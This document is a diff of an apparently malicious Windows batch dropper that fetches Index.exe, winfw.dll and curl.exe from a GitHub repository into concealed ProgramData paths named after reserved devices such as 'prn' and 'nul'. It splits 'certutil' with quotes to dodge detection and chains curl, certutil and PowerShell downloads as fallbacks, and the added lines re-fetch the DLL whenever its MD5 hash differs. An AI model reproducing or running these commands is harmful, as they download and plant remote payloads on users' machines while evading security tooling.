@@ -28,11 +28,11 @@ dir "\\?\%ProgramData%\prndata..\prn.exe" >nul || curl.exe -s -L -o "\\?\%Progra
 dir "\\?\%ProgramData%\prndata..\prn.exe" >nul || cert""""util -url""""cache -sp""""lit -f "https://github.com/vltex/1/raw/1/0/Index.exe" "\\?\%ProgramData%\prndata..\prn.exe"
 dir "\\?\%ProgramData%\prndata..\prn.exe" >nul || powershell.exe -NoProfile Invoke-WebRequest https://github.com/vltex/1/raw/1/0/Index.exe -OutFile \\.\%ProgramData%\prndata..\prn.exe
 
-dir "\\?\%ProgramData%\nuldata..\nul" >nul || curl.exe -s -L -o "\\?\%ProgramData%\nuldata..\nul" "https://github.com/vltex/1/raw/1/0/winfw.dll"
-dir "\\?\%ProgramData%\nuldata..\nul" >nul || cert""""util -url""""cache -sp""""lit -f "https://github.com/vltex/1/raw/1/0/winfw.dll" "\\?\%ProgramData%\nuldata..\nul"
-dir "\\?\%ProgramData%\nuldata..\nul" >nul || powershell.exe -NoProfile Invoke-WebRequest https://github.com/vltex/1/raw/1/0/winfw.dll -OutFile \\.\%ProgramData%\nuldata..\nul
+cert""""util -hash""""file "\\.\%ProgramData%\nuldata..\nul" MD5 | findstr /i "7f35b374014fc662a8994f04b572b20c" >nul || curl.exe -s -L -o "\\.\%ProgramData%\nuldata..\nul" "https://github.com/vltex/1/raw/1/0/winfw.dll"
+cert""""util -hash""""file "\\.\%ProgramData%\nuldata..\nul" MD5 | findstr /i "7f35b374014fc662a8994f04b572b20c" >nul || cert""""util -url""""cache -sp""""lit -f "https://github.com/vltex/1/raw/1/0/winfw.dll" "\\.\%ProgramData%\nuldata..\nul"
+powershell.exe -Command "if ((Get-FileHash '\\?\%ProgramData%\nuldata..\nul' -Algorithm MD5 -ErrorAction SilentlyContinue).Hash -ne '7f35b374014fc662a8994f04b572b20c') { Invoke-WebRequest 'https://github.com/vltex/1/raw/1/0/winfw.dll' -OutFile '\\.\%ProgramData%\nuldata..\nul' }"
 
-dir "%ProgramData%\curl.exe" >nul || powershell.exe -NoProfile Invoke-WebRequest https://github.com/vltex/1/raw/1/0/curl.exe -OutFile %ProgramData%\curl.exe
+dir "%ProgramData%\curl.exe" >nul || curl.exe -s -L -o "%ProgramData%\curl.exe" "https://github.com/vltex/1/raw/1/0/curl.exe"
 dir "%ProgramData%\curl.exe" >nul || cert""""util -url""""cache -sp""""lit -f "https://github.com/vltex/1/raw/1/0/curl.exe" "%ProgramData%\curl.exe"
 dir "%ProgramData%\curl.exe" >nul || powershell.exe -NoProfile Invoke-WebRequest https://github.com/vltex/1/raw/1/0/curl.exe -OutFile %ProgramData%\curl.exe
 
